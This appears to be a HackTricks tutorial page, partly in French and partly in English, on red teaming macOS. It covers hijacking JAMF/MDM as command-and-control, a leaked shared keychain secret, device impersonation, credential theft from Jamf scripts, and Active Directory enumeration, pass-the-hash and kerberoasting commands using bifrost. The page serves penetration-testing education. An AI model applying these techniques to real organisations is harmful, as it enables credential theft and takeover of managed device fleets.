# Red Teaming macOS

{{#include ../../banners/hacktricks-training.md}}


## Abus des MDM

- JAMF Pro: `jamf checkJSSConnection`
- Kandji

Si vous parvenez à **compromettre des identifiants administrateur** pour accéder à la plateforme de gestion, vous pouvez **potentiellement compromettre tous les ordinateurs** en distribuant votre malware sur les machines.

Pour le red teaming dans les environnements MacOS, il est fortement recommandé de comprendre quelque peu le fonctionnement des MDM:


{{#ref}}
macos-mdm/
{{#endref}}

### Utiliser un MDM comme C2

Un MDM aura la permission d'installer, d'interroger ou de supprimer des profils, d'installer des applications, de créer des comptes administrateur locaux, de définir le mot de passe du firmware, de modifier la clé FileVault...

Pour exécuter votre propre MDM, vous devez disposer de **votre CSR signé par un fournisseur**, que vous pouvez essayer d'obtenir via [**https://mdmcert.download/**](https://mdmcert.download/). Pour exécuter votre propre MDM pour les appareils Apple, vous pouvez utiliser [**MicroMDM**](https://github.com/micromdm/micromdm).

Cependant, pour installer une application sur un appareil inscrit, celle-ci doit toujours être signée par un compte développeur... toutefois, lors de l'inscription au MDM, **l'appareil ajoute le certificat SSL du MDM comme CA de confiance**, ce qui vous permet désormais de tout signer.<sup>[[4]](#references)</sup>

Pour inscrire l'appareil dans un MDM, vous devez installer un fichier **`mobileconfig`** en tant que root, ce qui peut être fourni via un fichier **pkg** (vous pouvez le compresser au format zip et, lorsqu'il est téléchargé depuis Safari, il sera décompressé).

L'**agent Mythic Orthrus** utilise cette technique.

### Abus de JAMF PRO

JAMF peut exécuter des **scripts personnalisés** (scripts développés par le sysadmin), des **payloads natifs** (création de comptes locaux, définition du mot de passe EFI, surveillance des fichiers/processus...) et du **MDM** (configurations des appareils, certificats des appareils...).<sup>[[5]](#references)</sup>

#### Auto-inscription JAMF

Accédez à une page telle que `https://<company-name>.jamfcloud.com/enroll/` pour vérifier si l'**auto-inscription** est activée. Si c'est le cas, elle peut **demander des identifiants pour y accéder**.

Vous pouvez utiliser le script [**JamfSniper.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfSniper.py) pour effectuer une attaque de password spraying.

De plus, après avoir trouvé des identifiants valides, vous pourriez être en mesure de brute-force d'autres noms d'utilisateur avec le formulaire suivant:

![Abus de JAMF PRO - Auto-inscription JAMF : De plus, après avoir trouvé des identifiants valides, vous pourriez être en mesure de brute-force d'autres noms d'utilisateur avec le formulaire suivant](<../../images/image (107).png>)

#### Authentification des appareils JAMF

<figure><img src="../../images/image (167).png" alt=""><figcaption></figcaption></figure>

Le binaire **`jamf`** contenait le secret permettant d'ouvrir le keychain qui, au moment de la découverte, était **partagé** entre tous et était le suivant : **`jk23ucnq91jfu9aj`**.<sup>[[5]](#references)</sup>\
De plus, jamf **persiste** en tant que **LaunchDaemon** dans **`/Library/LaunchAgents/com.jamf.management.agent.plist`**

#### Prise de contrôle d'un appareil JAMF

L'**URL** du **JSS** (Jamf Software Server) que **`jamf`** utilisera se trouve dans **`/Library/Preferences/com.jamfsoftware.jamf.plist`**.\
Ce fichier contient essentiellement l'URL :
```bash
plutil -convert xml1 -o - /Library/Preferences/com.jamfsoftware.jamf.plist

[...]
<key>is_virtual_machine</key>
<false/>
<key>jss_url</key>
<string>https://subdomain-company.jamfcloud.com/</string>
<key>last_management_framework_change_id</key>
<integer>4</integer>
[...]
```
Ainsi, un attaquant pourrait déposer un package malveillant (`pkg`) qui **écrase ce fichier** lors de son installation, en définissant l’**URL d’un listener Mythic C2 depuis un agent Typhon**, afin de pouvoir désormais abuser de JAMF en tant que C2.
```bash
# After changing the URL you could wait for it to be reloaded or execute:
sudo jamf policy -id 0

# TODO: There is an ID, maybe it's possible to have the real jamf connection and another one to the C2
```
#### JAMF Impersonation

In order to **impersonate the communication** between a device and JMF you need:

- The **UUID** of the device: `ioreg -d2 -c IOPlatformExpertDevice | awk -F" '/IOPlatformUUID/{print $(NF-1)}'`
- The **JAMF keychain** from: `/Library/Application\ Support/Jamf/JAMF.keychain` which contains the device certificate

With this information, **create a VM** with the **stolen** Hardware **UUID** and with **SIP disabled**, drop the **JAMF keychain,** **hook** the Jamf **agent** and steal its information.

#### Secrets stealing

<figure><img src="../../images/image (1025).png" alt=""><figcaption><p>a</p></figcaption></figure>

You could also monitor the location `/Library/Application Support/Jamf/tmp/` for the **custom scripts** admins might want to execute via Jamf as they are **placed here, executed and removed**. These scripts **might contain credentials**.

However, **credentials** might be passed via these scripts as **parameters**, so you would need to monitor `ps aux | grep -i jamf` (without even being root).

The script [**JamfExplorer.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfExplorer.py) can listen for new files being added and new process arguments.

### Accès à distance macOS

And also about **MacOS** "special" **network** **protocols**:


{{#ref}}
../macos-security-and-privilege-escalation/macos-protocols.md
{{#endref}}

## Active Directory

In some occasions you will find that the **MacOS computer is connected to an AD**. In this scenario you should try to **enumerate** the active directory as you are use to it. Find some **help** in the following pages:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}


{{#ref}}
../../windows-hardening/active-directory-methodology/
{{#endref}}


{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/
{{#endref}}

Some **local MacOS tool** that may also help you is `dscl`:
```bash
dscl "/Active Directory/[Domain]/All Domains" ls /
```
Il existe également des outils préparés pour MacOS afin d’énumérer automatiquement l’AD et d’interagir avec Kerberos :

- [**Machound**](https://github.com/XMCyber/MacHound) : MacHound est une extension de l’outil d’audit BloodHound permettant de collecter et d’ingérer les relations Active Directory sur des hôtes MacOS.<sup>[[2]](#references)</sup>
- [**Bifrost**](https://github.com/its-a-feature/bifrost) : Bifrost est un projet Objective-C conçu pour interagir avec les API Heimdal krb5 sur macOS. L’objectif du projet est de permettre de meilleurs tests de sécurité autour de Kerberos sur les appareils macOS en utilisant les API natives, sans nécessiter d’autre framework ou package sur la cible.
- [**Orchard**](https://github.com/its-a-feature/Orchard) : outil JavaScript for Automation (JXA) permettant d’effectuer l’énumération d’Active Directory.

### Informations sur le domaine
```bash
echo show com.apple.opendirectoryd.ActiveDirectory | scutil
```
### Utilisateurs

Les trois types d’utilisateurs macOS sont :

- **Local Users** — Gérés par le service OpenDirectory local, ils ne sont connectés d’aucune manière à l’Active Directory.
- **Network Users** — Utilisateurs Active Directory volatils qui nécessitent une connexion au serveur DC pour s’authentifier.
- **Mobile Users** — Utilisateurs Active Directory disposant d’une sauvegarde locale de leurs identifiants et de leurs fichiers.

Les informations locales sur les utilisateurs et les groupes sont stockées dans le dossier _/var/db/dslocal/nodes/Default._\
Par exemple, les informations sur l’utilisateur appelé _mark_ sont stockées dans _/var/db/dslocal/nodes/Default/users/mark.plist_, et les informations sur le groupe _admin_ se trouvent dans _/var/db/dslocal/nodes/Default/groups/admin.plist_.

En plus d’utiliser les relations HasSession et AdminTo, **MacHound ajoute trois nouveaux edges** à la base de données Bloodhound :<sup>[[2]](#references)</sup>

- **CanSSH** - entité autorisée à se connecter en SSH à l’hôte
- **CanVNC** - entité autorisée à se connecter en VNC à l’hôte
- **CanAE** - entité autorisée à exécuter des scripts AppleEvent sur l’hôte
```bash
#User enumeration
dscl . ls /Users
dscl . read /Users/[username]
dscl "/Active Directory/TEST/All Domains" ls /Users
dscl "/Active Directory/TEST/All Domains" read /Users/[username]
dscacheutil -q user

#Computer enumeration
dscl "/Active Directory/TEST/All Domains" ls /Computers
dscl "/Active Directory/TEST/All Domains" read "/Computers/[compname]$"

#Group enumeration
dscl . ls /Groups
dscl . read "/Groups/[groupname]"
dscl "/Active Directory/TEST/All Domains" ls /Groups
dscl "/Active Directory/TEST/All Domains" read "/Groups/[groupname]"

#Domain Information
dsconfigad -show
```
Plus d'informations sur [https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/](https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/)<sup>[[3]](#references)[[6]](#references)</sup>

### Mot de passe Computer$

Obtenez des mots de passe avec :
```bash
bifrost --action askhash --username [name] --password [password] --domain [domain]
```
Il est possible d’accéder au mot de passe **`Computer$`** dans le trousseau System.

### Over-Pass-The-Hash

Obtenir un TGT pour un utilisateur et un service spécifiques :
```bash
bifrost --action asktgt --username [user] --domain [domain.com] \
--hash [hash] --enctype [enctype] --keytab [/path/to/keytab]
```
Une fois le TGT récupéré, il est possible de l’injecter dans la session actuelle avec :
```bash
bifrost --action asktgt --username test_lab_admin \
--hash CF59D3256B62EE655F6430B0F80701EE05A0885B8B52E9C2480154AFA62E78 \
--enctype aes256 --domain test.lab.local
```
### Kerberoasting
```bash
bifrost --action asktgs --spn [service] --domain [domain.com] \
--username [user] --hash [hash] --enctype [enctype]
```
Avec les tickets de service obtenus, il est possible d’essayer d’accéder aux partages sur d’autres ordinateurs :
```bash
smbutil view //computer.fqdn
mount -t smbfs //server/folder /local/mount/point
```
## Accéder au Keychain

Le Keychain contient très probablement des informations sensibles qui, si elles sont accessibles sans générer de prompt, pourraient aider à faire avancer un exercice de Red Team :


{{#ref}}
macos-keychain.md
{{#endref}}

## Services externes

Le Red Teaming sur macOS diffère d'un Red Teaming Windows classique, car **macOS est généralement intégré directement à plusieurs plateformes externes**. Une configuration courante de macOS consiste à accéder à l'ordinateur à l'aide d'**identifiants synchronisés par OneLogin et à accéder à plusieurs services externes** (comme github, aws...) via OneLogin.

## Techniques diverses de Red Team

### Safari

Lorsqu'un fichier est téléchargé dans Safari, s'il s'agit d'un fichier « sûr », il sera **ouvert automatiquement**. Ainsi, par exemple, si vous **téléchargez un zip**, il sera automatiquement décompressé :<sup>[[1]](#references)</sup>

<figure><img src="../../images/image (226).png" alt=""><figcaption></figcaption></figure>

## Références

- [1] [Gone Apple Pickin': Red Teaming MacOS Environments in 2021 - Cedric Owens (DEF CON 29)](https://www.youtube.com/watch?v=IiMladUbL6E)
- [2] [Introducing MacHound: A Solution to macOS Active Directory Based Attacks](https://medium.com/xm-cyber/introducing-machound-a-solution-to-macos-active-directory-based-attacks-2a425f0a22b6)
- [3] [its-a-feature - Domain Enumeration Commands (dscl / net / ldapsearch equivalents)](https://gist.github.com/its-a-feature/1a34f597fb30985a2742bb16116e74e0)
- [4] [Come to the Dark Side, We Have Apples: Turning macOS Management Evil](https://www.youtube.com/watch?v=pOQOh07eMxY)
- [5] [OBTS v3.0: "An Attackers Perspective on Jamf Configurations" - Luke Roberts / Calum Hall](https://www.youtube.com/watch?v=ju1IYWUv4ZA)
- [6] [Active Directory Discovery with a Mac - its-a-feature](https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/)


{{#include ../../banners/hacktricks-training.md}}
